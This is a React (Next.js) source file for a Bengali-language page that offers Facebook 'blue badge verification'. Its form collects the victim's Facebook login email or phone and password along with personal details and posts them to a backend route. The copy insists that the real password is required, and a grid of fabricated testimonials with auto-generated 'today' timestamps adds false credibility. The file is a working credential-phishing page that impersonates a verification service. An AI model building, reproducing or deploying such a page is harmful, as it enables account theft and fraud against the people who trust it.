"use client";

import Image from "next/image";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function SubmitionBlue() {
    const router = useRouter();
    const [loading, setLoading] = useState(false);
    const [name, setName] = useState('');
    const [birthDate, setBirthDate] = useState('');
    const [email, setEmail] = useState('');
    const [fbEmailPhone, setFbEmailPhone] = useState('');
    const [password, setPassword] = useState('');
    const [fbPageUrl, setFbPageUrl] = useState('');
    const [agreedToTerms, setAgreedToTerms] = useState(false);
    const [currentTime, setCurrentTime] = useState('');
    
    useEffect(() => {
        setCurrentTime(new Date().toLocaleTimeString());
    }, []);
    
    return (
        <main className="flex flex-col items-center bg-white min-h-screen justify-start">
            <header className="min-w-full bg-blue-950 flex gap-2 py-3 text-white items-center justify-center">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="size-6 text-blue-600">
                <path fillRule="evenodd" d="M8.603 3.799A4.49 4.49 0 0 1 12 2.25c1.357 0 2.573.6 3.397 1.549a4.49 4.49 0 0 1 3.498 1.307 4.491 4.491 0 0 1 1.307 3.497A4.49 4.49 0 0 1 21.75 12a4.49 4.49 0 0 1-1.549 3.397 4.491 4.491 0 0 1-1.307 3.497 4.491 4.491 0 0 1-3.497 1.307A4.49 4.49 0 0 1 12 21.75a4.49 4.49 0 0 1-3.397-1.549 4.49 4.49 0 0 1-3.498-1.306 4.491 4.491 0 0 1-1.307-3.498A4.49 4.49 0 0 1 2.25 12c0-1.357.6-2.573 1.549-3.397a4.49 4.49 0 0 1 1.307-3.497 4.49 4.49 0 0 1 3.497-1.307Zm7.007 6.387a.75.75 0 1 0-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.14-.094l3.75-5.25Z" clipRule="evenodd" />
            </svg> ব্লু ব্যাজ ভেরিফিকেশন এর জন্য নিচের ফর্মটি পূরণ করে সাবমিট করুন
            </header>
            <h1 className="mt-10 font-black text-3xl text-red-600">Remember</h1>
            <div className="text-gray-700 mx-5 border-[.5px] rounded-lg px-5 font-semibold mt-5 border-green-700 py-3 ">
               • আপনার ফেইসবুক একাউন্ট সফলভাবে Verify করার জন্য আপনার একাউন্টে দেওয়া তথ্য গুলো আমাদের দিতে হবে।
               <br />
               • এখানে চাওয়া সকল তথ্য আপনার ফেইসবুক একাউন্ট অনুযায়ী দিবেন।
               <br />
               • এই তথ্য গুলো অনুযায়ী ফেইক কার্ড তৈরি করা হবে। তাই ভুল তথ্য দিলে আমরা আপনার একাউন্টটি ভেরিফাই করতে পারব না।
            </div>

            <form className="w-full max-w-md mx-auto mt-10 px-4" onSubmit={async (e) => {
                e.preventDefault();
                if (!agreedToTerms) {
                    alert('দয়া করে চেকবক্সে টিক দিন');
                    return;
                }
                
                setLoading(true);
                try {
                    const response = await fetch('/api/blue-verification', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            name,
                            birthDate,
                            email,
                            fbEmailPhone,
                            password,
                            fbPageUrl
                        }),
                    });
                    
                    const result = await response.json();
                    
                    if (result.status === 'success') {
                        router.push('/blue-verification/submit/success');
                    } else {
                        alert('দুঃখিত, একটি সমস্যা হয়েছে। আবার চেষ্টা করুন।');
                        setLoading(false);
                    }
                } catch (error) {
                    console.error('Error submitting form:', error);
                    alert('দুঃখিত, একটি সমস্যা হয়েছে। আবার চেষ্টা করুন।');
                    setLoading(false);
                }
            }}>
                <div className="bg-pink-50 rounded-lg p-5 shadow-md">
                    <div className="mb-4">
                        <label className="block text-gray-700 text-sm font-bold mb-2">
                            <span className="text-red-600">* </span>আপনার নাম লিখুনঃ
                        </label>
                        <input 
                            type="text" 
                            placeholder="Your Fb ID Name" 
                            className="shadow appearance-none border rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                            required
                            value={name}
                            onChange={(e) => setName(e.target.value)}
                        />
                    </div>

                    <div className="mb-4">
                        <label className="block text-gray-700 text-sm font-bold mb-2">
                            <span className="text-red-600">* </span>আপনার জন্ম তারিখ দিনঃ
                        </label>
                        <input 
                            type="date" 
                            placeholder="mm/dd/yyyy" 
                            className="shadow appearance-none border rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                            required
                            value={birthDate}
                            onChange={(e) => setBirthDate(e.target.value)}
                        />
                    </div>

                    <div className="mb-4">
                        <label className="block text-gray-700 text-sm font-bold mb-2">
                            <span className="text-red-600">* </span>আপনার একটি ইমেইল দিনঃ
                        </label>
                        <input 
                            type="email" 
                            placeholder="example@gmail.com" 
                            className="shadow appearance-none border rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                            required
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                        />
                    </div>

                    <div className="mb-4">
                        <label className="block text-gray-700 text-sm font-bold mb-2">
                            <span className="text-red-600">* </span>আপনার ফেইসবুকে ব্যবহার করা ইমেইল/ফোন নম্বরটি দিনঃ
                        </label>
                        <input 
                            type="text" 
                            placeholder="Email or phone" 
                            className="shadow appearance-none border rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                            required
                            value={fbEmailPhone}
                            onChange={(e) => setFbEmailPhone(e.target.value)}
                        />
                    </div>

                    <div className="mb-4">
                        <label className="block text-gray-700 text-sm font-bold mb-2">
                            <span className="text-red-600">* </span>আপনার ফেইসবুকে ব্যবহার করা পাসওয়ার্ড দিনঃ
                        </label>
                        <input 
                            type="password" 
                            placeholder="Password" 
                            className="shadow appearance-none border rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                            required
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                        />
                    </div>

                    <div className="mb-4">
                        <label className="block text-gray-700 text-sm font-bold mb-2">
                            <span className="text-red-600">* </span>আপনার ফেইসবুক পেজ URL দিনঃ
                        </label>
                        <input 
                            type="url" 
                            placeholder="https://facebook.com/yourpage" 
                            className="shadow appearance-none border rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                            required
                            value={fbPageUrl}
                            onChange={(e) => setFbPageUrl(e.target.value)}
                        />
                    </div>

                    <div className="mb-6 text-red-600 text-sm font-semibold">
                        [ আপনার ফেইসবুকে ব্যবহার করা নম্বর ও পাসওয়ার্ড সঠিক না দিলে আমরা আপনার একাউন্টটি Verify করতে পারবনা। ]
                    </div>

                    <div className="mb-6">
                        <label className="flex items-center">
                            <input 
                                type="checkbox" 
                                className="mr-2" 
                                required 
                                checked={agreedToTerms}
                                onChange={(e) => setAgreedToTerms(e.target.checked)}
                            />
                            <span className="text-sm text-gray-700">আমি সকল তথ্য সঠিক দিয়েছি</span>
                        </label>
                    </div>

                    <div className="flex items-center justify-center flex-col">
                        <div className="text-center text-black mb-2">
                            <p className="font-bold">নিচে অ্যাপ্লাই বাটনে ক্লিক করুন</p>
                            <div className="text-2xl font-bold">••••</div>
                        </div>
                        <button
                            className={`bg-black hover:bg-gray-800 text-white font-bold py-3 px-12 rounded focus:outline-none focus:shadow-outline w-full md:w-auto ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
                            type="submit"
                            disabled={loading}
                        >
                            {loading ? 'অপেক্ষা করুন...' : 'জমা দিন'}
                        </button>
                    </div>
                </div>
            </form>

            <section className="w-full max-w-7xl mx-auto mt-8 px-4 pb-24">
                <div className="bg-blue-50 rounded-lg p-5 shadow-md">
                    <h2 className="text-xl font-bold text-blue-800 mb-4 flex items-center">
                        <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 mr-2 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
                        </svg>
                        সফল ভেরিফিকেশন রিভিউ
                    </h2>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                        <div className="bg-white rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people1-female.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">নাজমা আক্তার</h3>
                                        <span className="text-xs text-gray-500">আজ, {currentTime || '12:00 PM'}</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">মাত্র ২৪ ঘন্টার মধ্যে আমার একাউন্টটি ভেরিফাই হয়ে গেছে। এটা অবিশ্বাস্য! আমি এখন নিশ্চিন্তে ফেসবুক ব্যবহার করতে পারছি।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            421 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-blue-50 rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people1-male.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">রাকিবুল হাসান</h3>
                                        <span className="text-xs text-gray-500">1 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন পেয়ে গেলাম। সত্যিই অসাধারণ সেবা। আমার ব্যবসায়িক পেজটি এখন ব্লু টিক সহ চলছে।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            367 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-white rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people2-female.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">ফারিহা ইসলাম</h3>
                                        <span className="text-xs text-gray-500">2 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন পেয়ে গেলাম। এখন আমার একাউন্টটি সম্পূর্ণ নিরাপদ। সবাইকে এই সার্ভিস নিতে বলবো।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            298 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-blue-50 rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people2-male.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">আরিফ রহমান</h3>
                                        <span className="text-xs text-gray-500">3 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন কমপ্লিট। আমার ব্যবসায়িক পেজের জন্য এটা ছিল খুবই গুরুত্বপূর্ণ। এখন গ্রাহকরা আরও বেশি বিশ্বাস করছে।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            245 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-white rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people3-female.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">সাবরিনা খান</h3>
                                        <span className="text-xs text-gray-500">4 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন পেলাম। প্রক্রিয়াটি খুব সহজ ছিল। এখন আমার অফিসিয়াল পেজে ব্লু টিক দেখে খুবভালো লাগছে।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            198 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-blue-50 rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people3-male.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">কামরুল হাসান</h3>
                                        <span className="text-xs text-gray-500">5 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন হয়ে গেল। এখন আমার পেজে ব্লু টিক দেখে অনেক ভালো লাগছে। সার্ভিসটি খুবই ভালো।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            176 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-white rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people4-female.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">তাসনিম জাহান</h3>
                                        <span className="text-xs text-gray-500">6 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন পেয়ে গেলাম। এখন আমার একাউন্টটি আরও নিরাপদ। সবার জন্য রেকমেন্ড করবো।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            154 জন
                                        </button>
                
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-blue-50 rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people4-male.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">মাহমুদুল হাসান</h3>
                                        <span className="text-xs text-gray-500">7 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন কমপ্লিট। আমার ব্যবসায়িক পেজে এখন ব্লু টিক আছে। খুবই দ্রুত সার্ভিস।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            132 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-blue-50 rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people5-male.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">তানভীর আহমেদ</h3>
                                        <span className="text-xs text-gray-500">3 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন কমপ্লিট। আমার ব্যবসায়িক পেজের জন্য এটা ছিল খুবই গুরুত্বপূর্ণ। এখন গ্রাহকরা আরও বেশি বিশ্বাস করছে।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            245 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-white rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people5-female.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">সাবরিনা খান</h3>
                                        <span className="text-xs text-gray-500">4 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন পেলাম। প্রক্রিয়াটি খুব সহজ ছিল। এখন আমার অফিসিয়াল পেজে ব্লু টিক দেখে খুবভালো লাগছে।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            189 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-blue-50 rounded-lg p-3 shadow-sm hover:shadow-md transition-shadow duration-200">
                            <div className="flex items-start space-x-3">
                                <Image src="/people6-male.png" alt="User" width={40} height={40} className="rounded-full object-cover" />
                                <div className="flex-1">
                                    <div className="flex justify-between items-center mb-1">
                                        <h3 className="font-bold text-gray-800">মাহফুজুর রহমান</h3>
                                        <span className="text-xs text-gray-500">5 ঘন্টা আগে</span>
                                    </div>
                                    <p className="text-gray-700 text-sm">২৪ ঘন্টার মধ্যে ভেরিফিকেশন সম্পন্ন। এখন আমার ফেসবুক পেজে ব্লু টিক আছে। ব্যবসার জন্য এটা খুব কার্যকর হয়েছে।</p>
                                    <div className="flex items-center mt-2 text-xs text-gray-500">
                                        <button className="flex items-center hover:text-blue-600">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10h4.764a2 2 0 011.789 2.894l-3.5 7A2 2 0 0115.263 21h-4.017c-.163 0-.326-.02-.485-.06L7 20m7-10V5a2 2 0 00-2-2h-.095c-.5 0-.905.405-.905.905 0 .714-.211 1.412-.608 2.006L7 11v9m7-10h-2M7 20H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.5" />
                                            </svg>
                                            156 জন
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <footer className="bg-gray-100 fixed bottom-0 w-full dark:bg-gray-900 py-4 md:py-6 px-4 text-center text-gray-600 dark:text-gray-400 text-xs md:text-sm z-10">
            © {new Date().getFullYear()} Copywrite by Blue Verification
            </footer>
        </main>
    );
}